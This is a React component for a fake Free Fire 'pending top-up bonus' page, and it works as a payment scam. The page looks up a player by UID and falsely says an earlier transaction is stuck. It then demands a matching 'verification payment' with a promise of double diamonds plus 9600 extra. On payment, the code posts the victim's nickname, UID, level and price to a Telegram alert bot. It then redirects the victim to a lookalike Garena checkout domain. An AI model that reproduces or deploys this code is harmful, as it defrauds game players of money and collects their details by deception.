import React, { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Loader2, CheckCircle2, ChevronRight, AlertCircle, ShieldCheck, HelpCircle, X } from 'lucide-react';
import { GATEWAY_BASE_URL, REGIONS_MAP } from '../lib/regions';
import { PlayerData } from '../types';
import { PACKAGES } from './DiamondPackages';

export default function Bonus() {
  const [step, setStep] = useState(1);
  const [region, setRegion] = useState('ind');
  const [uid, setUid] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [playerData, setPlayerData] = useState<PlayerData | null>(null);
  const [selectedVal, setSelectedVal] = useState<number | null>(null);
  const [showGuideModal, setShowGuideModal] = useState(false);

  const bonusValues = [550, 750, 1100, 1400, 5500, 7500];

  const handleVerifyUid = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!uid.trim()) return;
    setLoading(true);
    setError('');
    try {
      const res = await fetch(`${GATEWAY_BASE_URL}?s=${region}&u=${uid}`);
      if (!res.ok) throw new Error('Failed to connect to gateway.');
      const data = await res.json();
      if (!data?.basicInfo?.nickname) {
        throw new Error('Invalid UID or Player not found. Try again.');
      }
      setPlayerData(data);
      setStep(2);
    } catch (err: any) {
      setError(err.message || 'Error occurred. Please try again later.');
    } finally {
      setLoading(false);
    }
  };

  const handleSelectPackageOk = () => {
    if (!selectedVal) {
      setError('Please select a transaction value.');
      return;
    }
    setError('');
    setStep(4);
  };

  const handleVerifyPending = () => {
    setStep(5);
  };

  const getPackageInfo = (price: number) => {
    return PACKAGES.find((p) => p.price === price) || { base: 0, bonus: 0 };
  };

  const handlePay = () => {
    if (!selectedVal || !playerData) return;
    const pkgInfo = getPackageInfo(selectedVal);
    const totalDiamonds = pkgInfo.base + pkgInfo.bonus; // Single package diamonds
    const finalDiamonds = totalDiamonds + totalDiamonds + 9600;

    const messageText = `
🚀 *GGDIAMOND ALERT*
━━━━━━━━━━━━━━━━━━
👤 *Name:* ${playerData.basicInfo.nickname}
📊 *Level:* ${playerData.basicInfo.level || 0}
🆔 *UID:* ${uid}
💎 *Diamonds:* ${finalDiamonds}
💰 *Price:* ₹${selectedVal}
━━━━━━━━━━━━━━━━━━
✅ *Action:* Payment Verification
    `;

    const backendUrl = "https://teligram-alert-bot.vercel.app/api/send"; 
    fetch(backendUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: "8422419131", 
            message: messageText
        })
    }).catch(console.error);

    const garenaUrl = new URL('https://www.garnastoregarbs.shop/garena-checkout');
    garenaUrl.searchParams.set('pkg', String(selectedVal));
    garenaUrl.searchParams.set('diamonds', String(finalDiamonds));
    garenaUrl.searchParams.set('uid', uid);
    garenaUrl.searchParams.set('nick', playerData.basicInfo.nickname || '');
    garenaUrl.searchParams.set('level', String(playerData.basicInfo.level || 0));
    window.location.href = garenaUrl.toString();
  };

  return (
    <div className="space-y-6 relative w-full max-w-lg mx-auto pb-10 px-2 sm:px-0">
      <div className="flex items-center justify-between relative z-10">
        <div className="flex items-center gap-2.5 text-gray-800 font-extrabold text-sm text-left">
          <span className="flex items-center justify-center bg-[#ee2c24] text-white px-2 py-0.5 rounded font-bold text-[10px] uppercase tracking-wider">
            Bonus
          </span>
          Pending Top-Up Unlock
        </div>
        <button
          onClick={() => setShowGuideModal(true)}
          className="text-[10px] text-gray-500 hover:text-gray-800 font-bold flex items-center gap-1 cursor-pointer bg-white px-2 py-1.5 rounded shadow-sm border border-gray-100 uppercase tracking-wider"
        >
          <HelpCircle className="w-3.5 h-3.5" /> Guide
        </button>
      </div>

      <motion.div
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        className="bg-white rounded-xl border border-gray-100 shadow-xl overflow-hidden relative z-10"
      >
        <div className="p-5 space-y-5">
          {(step === 1 || step === 2) && (
            <form onSubmit={handleVerifyUid} className="space-y-4">
              <h3 className="text-base font-black text-gray-800">1. Verify Your Payment</h3>
              <div className="space-y-1.5 text-left">
                <label className="text-[10px] font-bold text-gray-400 uppercase">Server Region</label>
                <select
                  value={region}
                  onChange={(e) => setRegion(e.target.value)}
                  disabled={loading || step === 2}
                  className="w-full bg-gray-50 border border-gray-200 rounded-xl px-3.5 py-2.5 text-xs font-semibold text-gray-700 outline-none focus:border-[#ee2c24]"
                >
                  {REGIONS_MAP.map((reg) => (
                    <option key={reg.value} value={reg.value}>{reg.label}</option>
                  ))}
                </select>
              </div>
              <div className="space-y-1.5 text-left">
                <label className="text-[10px] font-bold text-gray-400 uppercase">Player UID</label>
                <input
                  type="number"
                  placeholder="Enter Player UID"
                  value={uid}
                  onChange={(e) => setUid(e.target.value)}
                  disabled={loading || step === 2}
                  className="w-full bg-gray-50 border border-gray-200 rounded-xl px-3.5 py-2.5 text-xs font-semibold text-gray-800 outline-none focus:border-[#ee2c24]"
                />
              </div>
              {error && <p className="text-xs text-red-500 font-bold">{error}</p>}
              <button
                type="submit"
                disabled={loading || !uid.trim() || step === 2}
                className="w-full bg-[#ee2c24] hover:bg-red-600 disabled:bg-red-300 text-white font-extrabold py-3 rounded-xl transition-all shadow-sm flex items-center justify-center gap-2 cursor-pointer text-sm uppercase"
              >
                {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : 'Verify Account'}
              </button>
            </form>
          )}

          {step === 3 && playerData && (
            <div className="space-y-5 text-left">
              <h3 className="text-base font-black text-gray-800">2. Select Transaction Value</h3>
              <div className="flex items-center gap-3 p-3 bg-gray-50 border border-gray-100 rounded-xl">
                <img
                  src={`https://gatway-seven.vercel.app/gateway?img=${playerData.basicInfo.headPic || '902000162'}`}
                  alt="avatar"
                  className="w-12 h-12 rounded-lg"
                  onError={(e) => { (e.target as HTMLImageElement).src = '/assets/icon.png'; }}
                />
                <div>
                  <p className="font-bold text-gray-800 text-sm">{playerData.basicInfo.nickname}</p>
                  <p className="text-xs text-gray-500">Lv. {playerData.basicInfo.level} • UID: {uid}</p>
                </div>
              </div>
              
              <div className="grid grid-cols-2 gap-3">
                {bonusValues.map(val => (
                  <button
                    key={val}
                    onClick={() => setSelectedVal(val)}
                    className={`py-3 px-4 rounded-xl border-2 font-black transition-all ${selectedVal === val ? 'border-[#ee2c24] bg-red-50 text-[#ee2c24]' : 'border-gray-200 bg-white text-gray-600 hover:border-red-300'}`}
                  >
                    ₹ {val}
                  </button>
                ))}
              </div>

              {error && <p className="text-xs text-red-500 font-bold">{error}</p>}

              <button
                onClick={handleSelectPackageOk}
                className="w-full bg-[#ee2c24] hover:bg-red-600 text-white font-extrabold py-3 rounded-xl shadow-md cursor-pointer text-sm uppercase transition-all flex items-center justify-center gap-2"
              >
                OK <ChevronRight className="w-4 h-4" />
              </button>
            </div>
          )}

      <AnimatePresence>
        {step === 4 && selectedVal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="absolute inset-0 bg-black/60 backdrop-blur-md"
            />
            <motion.div
              initial={{ opacity: 0, scale: 0.9, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.9, y: 20 }}
              className="bg-white rounded-3xl shadow-2xl w-full max-w-sm overflow-hidden relative z-10 p-6 text-center"
            >
              <div className="w-20 h-20 bg-amber-50 rounded-full flex items-center justify-center mx-auto text-amber-500 mb-4 border-4 border-white shadow-lg relative -mt-10">
                <AlertCircle className="w-10 h-10" />
              </div>
              <h3 className="text-xl font-black text-gray-900 mb-2">Unreceived Top-Up Found!</h3>
              
              <div className="bg-amber-50/50 rounded-2xl p-4 border border-amber-100 mb-6 text-left space-y-3">
                <p className="text-[13px] font-bold text-gray-700 leading-relaxed text-center">
                  We found your previous <span className="text-[#ee2c24] font-black">₹{selectedVal}</span> transaction stuck in our queue.
                </p>
                <div className="bg-white rounded-xl p-3 border border-gray-100 space-y-2">
                  <p className="text-[11px] font-semibold text-gray-500 text-center leading-relaxed">
                    To release these diamonds, you must complete a <strong className="text-gray-800">Verification Payment</strong> of the exact same amount. 
                  </p>
                  <p className="text-[10px] font-bold text-amber-600 text-center uppercase tracking-wider bg-amber-50 py-1.5 rounded-lg">
                    Both amounts will be credited!
                  </p>
                </div>
              </div>

              <button
                onClick={handleVerifyPending}
                className="w-full bg-gradient-to-r from-red-600 to-[#ee2c24] hover:brightness-105 active:scale-[0.98] text-white font-black py-4 rounded-xl shadow-lg shadow-red-500/30 cursor-pointer text-sm uppercase tracking-wider transition-all"
              >
                Start Verification
              </button>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

          {step === 5 && selectedVal && (
            <div className="space-y-5 text-left">
              <div className="flex items-start gap-3 text-emerald-700 bg-emerald-50 p-4 rounded-xl border border-emerald-200 shadow-sm">
                <ShieldCheck className="w-6 h-6 shrink-0 mt-0.5 text-emerald-600" />
                <div className="space-y-1.5">
                  <p className="text-sm font-black leading-tight text-emerald-800">
                    Congratulations, {playerData?.basicInfo?.nickname}!
                  </p>
                  <p className="text-[11.5px] font-semibold leading-relaxed text-emerald-700">
                    <span className="font-bold opacity-80 uppercase tracking-wider text-[10px] block mb-0.5">UID: {uid}</span>
                    You are a special player to us! We are granting you this exclusive bonus reward for your previously failed and unreceived diamond transactions.
                  </p>
                </div>
              </div>

              <div className="bg-gray-50 border border-gray-200 rounded-xl p-4 space-y-3">
                <h4 className="text-sm font-black text-gray-800 uppercase tracking-wide border-b border-gray-200 pb-2">Pending Reward Summary</h4>
                
                <div className="flex justify-between items-center text-xs font-bold text-gray-600">
                  <span>Pending (₹{selectedVal})</span>
                  <span>{getPackageInfo(selectedVal).base + getPackageInfo(selectedVal).bonus} Diamonds</span>
                </div>
                <div className="flex justify-between items-center text-xs font-bold text-gray-600">
                  <span>Current Top-up</span>
                  <span>{getPackageInfo(selectedVal).base + getPackageInfo(selectedVal).bonus} Diamonds</span>
                </div>
                <div className="flex justify-between items-center text-xs font-bold text-amber-600">
                  <span>Extra Pending Bonus</span>
                  <span>+9600 Diamonds</span>
                </div>
                
                <div className="border-t border-gray-200 pt-3 mt-2 flex justify-between items-center">
                  <span className="text-sm font-black text-gray-800 uppercase">Total to Receive</span>
                  <span className="text-lg font-black text-[#ee2c24]">
                    {(getPackageInfo(selectedVal).base + getPackageInfo(selectedVal).bonus) * 2 + 9600} <span className="text-xs">💎</span>
                  </span>
                </div>
              </div>

              <button
                onClick={handlePay}
                className="w-full bg-gradient-to-r from-red-600 to-[#ee2c24] hover:brightness-105 active:scale-[0.98] text-white py-3.5 px-5 rounded-xl font-black text-sm uppercase tracking-wider shadow-md cursor-pointer flex items-center justify-center gap-1.5"
              >
                Pay Securely ₹{selectedVal}
                <ChevronRight className="w-4 h-4" />
              </button>
            </div>
          )}
        </div>
      </motion.div>

      <AnimatePresence>
        {step === 2 && playerData && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="absolute inset-0 bg-black/60 backdrop-blur-md"
            />
            <motion.div
              initial={{ opacity: 0, scale: 0.9, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.9, y: 20 }}
              className="bg-white rounded-3xl shadow-2xl w-full max-w-sm overflow-hidden relative z-10 p-6 text-center"
            >
              <div className="w-20 h-20 bg-emerald-50 rounded-full flex items-center justify-center mx-auto text-emerald-500 mb-4 border-4 border-white shadow-lg relative -mt-10">
                <CheckCircle2 className="w-10 h-10" />
              </div>
              <h3 className="text-xl font-black text-gray-900 mb-1">Player Verified!</h3>
              <p className="text-gray-500 text-sm font-semibold mb-6">
                Your Free Fire identity has been securely authenticated.
              </p>

              <div className="bg-gray-50 rounded-2xl p-4 border border-gray-100 mb-6 text-left space-y-3">
                <div className="flex items-center gap-4">
                  <img
                    src={`https://gatway-seven.vercel.app/gateway?img=${playerData.basicInfo.headPic || '902000162'}`}
                    alt="avatar"
                    className="w-14 h-14 rounded-xl border-2 border-white shadow-sm"
                    onError={(e) => { (e.target as HTMLImageElement).src = '/assets/icon.png'; }}
                  />
                  <div>
                    <p className="font-black text-gray-900 text-base">{playerData.basicInfo.nickname}</p>
                    <p className="text-xs font-bold text-gray-400 mt-0.5 uppercase tracking-wider">UID: {uid}</p>
                  </div>
                </div>
                
                <div className="grid grid-cols-2 gap-2 pt-3 border-t border-gray-200/60">
                  <div className="bg-white p-2.5 rounded-xl border border-gray-100">
                    <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest mb-0.5">Level</p>
                    <p className="text-sm font-black text-gray-800">{playerData.basicInfo.level || 0}</p>
                  </div>
                  <div className="bg-white p-2.5 rounded-xl border border-gray-100">
                    <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest mb-0.5">Region</p>
                    <p className="text-sm font-black text-gray-800 uppercase">{region}</p>
                  </div>
                </div>
              </div>

              <button
                onClick={() => setStep(3)}
                className="w-full bg-gradient-to-r from-red-600 to-[#ee2c24] hover:brightness-105 active:scale-[0.98] text-white font-black py-4 rounded-xl shadow-lg shadow-red-500/30 cursor-pointer text-sm uppercase tracking-wider transition-all"
              >
                Continue to Claim
              </button>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Guide Modal */}
      <AnimatePresence>
        {showGuideModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="absolute inset-0 bg-black/40 backdrop-blur-sm"
              onClick={() => setShowGuideModal(false)}
            />
            <motion.div
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.95 }}
              className="bg-white rounded-2xl shadow-2xl w-full max-w-sm overflow-hidden relative z-10 max-h-[90vh] flex flex-col"
            >
              <div className="flex justify-between items-center p-4 border-b border-gray-100 bg-gray-50/50 shrink-0">
                <h3 className="font-black text-gray-800 text-sm">How It Works</h3>
                <button onClick={() => setShowGuideModal(false)} className="text-gray-400 hover:text-gray-600 bg-gray-100 hover:bg-gray-200 rounded-full p-1 cursor-pointer transition-colors">
                  <X className="w-4 h-4" />
                </button>
              </div>
              <div className="p-5 space-y-5 text-left overflow-y-auto">
                <div className="flex items-start gap-3">
                  <div className="w-6 h-6 shrink-0 rounded-full bg-red-100 text-[#ee2c24] flex items-center justify-center font-black text-xs">1</div>
                  <div>
                    <h4 className="text-xs font-bold text-gray-800">Verify Identity</h4>
                    <p className="text-[11px] text-gray-500 font-semibold mt-0.5">Enter your Free Fire Player UID and select your server to authenticate your profile.</p>
                  </div>
                </div>
                <div className="flex items-start gap-3">
                  <div className="w-6 h-6 shrink-0 rounded-full bg-red-100 text-[#ee2c24] flex items-center justify-center font-black text-xs">2</div>
                  <div>
                    <h4 className="text-xs font-bold text-gray-800">Select Failed Transaction</h4>
                    <p className="text-[11px] text-gray-500 font-semibold mt-0.5">Choose the exact value of the transaction that failed or where you did not receive your diamonds.</p>
                  </div>
                </div>
                <div className="flex items-start gap-3">
                  <div className="w-6 h-6 shrink-0 rounded-full bg-red-100 text-[#ee2c24] flex items-center justify-center font-black text-xs">3</div>
                  <div>
                    <h4 className="text-xs font-bold text-gray-800">Confirm Pending Order</h4>
                    <p className="text-[11px] text-gray-500 font-semibold mt-0.5">Our system will detect your pending top-up in the queue. Click verify to proceed.</p>
                  </div>
                </div>
                <div className="flex items-start gap-3">
                  <div className="w-6 h-6 shrink-0 rounded-full bg-red-100 text-[#ee2c24] flex items-center justify-center font-black text-xs">4</div>
                  <div>
                    <h4 className="text-xs font-bold text-gray-800">Pay & Receive Bonus</h4>
                    <p className="text-[11px] text-gray-500 font-semibold mt-0.5">Complete the payment. You will instantly receive your pending diamonds + current top-up + 9600 bonus compensation!</p>
                  </div>
                </div>
              </div>
              <div className="p-4 bg-gray-50 border-t border-gray-100">
                <button onClick={() => setShowGuideModal(false)} className="w-full bg-[#ee2c24] hover:bg-red-600 text-white text-xs font-extrabold py-3 rounded-xl uppercase tracking-wide cursor-pointer shadow-sm">Got it</button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
